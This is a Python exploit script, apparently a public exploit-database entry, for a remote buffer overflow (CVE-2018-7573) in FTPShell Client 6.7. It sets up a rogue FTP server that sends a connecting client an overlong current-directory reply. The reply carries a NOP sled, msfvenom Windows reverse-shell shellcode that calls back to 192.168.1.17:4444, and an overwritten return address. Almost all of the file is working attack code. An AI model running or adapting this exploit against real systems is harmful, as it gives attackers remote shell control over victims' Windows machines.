# -*- coding: utf-8 -*-

# Exploit Title: FTPShell Client 6.7 - Remote Buffer Overflow
# Date: 2018-01-03
# Exploit Author: Sebasti√°n Castro @r4wd3r
# Vendor Homepage: http://www.ftpshell.com/index.htm
# Software Link: http://www.ftpshell.com/download.htm
# Version: 6.7
# Tested on: Windows Server 2008 R2 x64, Windows 7 SP1 x64, Windows XP SP3 x86.
# CVE : CVE-2018-7573

import socket
import sys

port = 21

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.17 LPORT=4444 -f python -b '\x00\x22\x0d\x0a'
buf =  ""
buf += "\xda\xc3\xd9\x74\x24\xf4\x58\x2b\xc9\xba\x20\x01\x2e"
buf += "\x12\xb1\x52\x31\x50\x17\x83\xc0\x04\x03\x70\x12\xcc"
buf += "\xe7\x8c\xfc\x92\x08\x6c\xfd\xf2\x81\x89\xcc\x32\xf5"
buf += "\xda\x7f\x83\x7d\x8e\x73\x68\xd3\x3a\x07\x1c\xfc\x4d"
buf += "\xa0\xab\xda\x60\x31\x87\x1f\xe3\xb1\xda\x73\xc3\x88"
buf += "\x14\x86\x02\xcc\x49\x6b\x56\x85\x06\xde\x46\xa2\x53"
buf += "\xe3\xed\xf8\x72\x63\x12\x48\x74\x42\x85\xc2\x2f\x44"
buf += "\x24\x06\x44\xcd\x3e\x4b\x61\x87\xb5\xbf\x1d\x16\x1f"
buf += "\x8e\xde\xb5\x5e\x3e\x2d\xc7\xa7\xf9\xce\xb2\xd1\xf9"
buf += "\x73\xc5\x26\x83\xaf\x40\xbc\x23\x3b\xf2\x18\xd5\xe8"
buf += "\x65\xeb\xd9\x45\xe1\xb3\xfd\x58\x26\xc8\xfa\xd1\xc9"
buf += "\x1e\x8b\xa2\xed\xba\xd7\x71\x8f\x9b\xbd\xd4\xb0\xfb"
buf += "\x1d\x88\x14\x70\xb3\xdd\x24\xdb\xdc\x12\x05\xe3\x1c"
buf += "\x3d\x1e\x90\x2e\xe2\xb4\x3e\x03\x6b\x13\xb9\x64\x46"
buf += "\xe3\x55\x9b\x69\x14\x7c\x58\x3d\x44\x16\x49\x3e\x0f"
buf += "\xe6\x76\xeb\x80\xb6\xd8\x44\x61\x66\x99\x34\x09\x6c"
buf += "\x16\x6a\x29\x8f\xfc\x03\xc0\x6a\x97\xeb\xbd\x75\x76"
buf += "\x84\xbf\x75\x69\x08\x49\x93\xe3\xa0\x1f\x0c\x9c\x59"
buf += "\x3a\xc6\x3d\xa5\x90\xa3\x7e\x2d\x17\x54\x30\xc6\x52"
buf += "\x46\xa5\x26\x29\x34\x60\x38\x87\x50\xee\xab\x4c\xa0"
buf += "\x79\xd0\xda\xf7\x2e\x26\x13\x9d\xc2\x11\x8d\x83\x1e"
buf += "\xc7\xf6\x07\xc5\x34\xf8\x86\x88\x01\xde\x98\x54\x89"
buf += "\x5a\xcc\x08\xdc\x34\xba\xee\xb6\xf6\x14\xb9\x65\x51"
buf += "\xf0\x3c\x46\x62\x86\x40\x83\x14\x66\xf0\x7a\x61\x99"
buf += "\x3d\xeb\x65\xe2\x23\x8b\x8a\x39\xe0\xbb\xc0\x63\x41"
buf += "\x54\x8d\xf6\xd3\x39\x2e\x2d\x17\x44\xad\xc7\xe8\xb3"
buf += "\xad\xa2\xed\xf8\x69\x5f\x9c\x91\x1f\x5f\x33\x91\x35"


try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(("0.0.0.0", port))
        s.listen(5)
        print("[+] FTP server started on port: "+str(port)+"\r\n")
except:
        print("[x] Failed to start the server on port: "+str(port)+"\r\n")

eip = "\xed\x2e\x45" # CALL ESI from FTPShell.exe : 0x00452eed
nops = "\x90"*32
junk = "F"*(400 - len(nops) - len(buf))
payload = nops + buf + junk + eip

while True:
    conn, addr = s.accept()
    conn.send('220 FTP Server\r\n')
    print(conn.recv(1024))
    conn.send("331 OK\r\n")
    print(conn.recv(1024))
    conn.send('230 OK\r\n')
    print(conn.recv(1024))
    conn.send('220 "'+payload+'" is current directory\r\n')
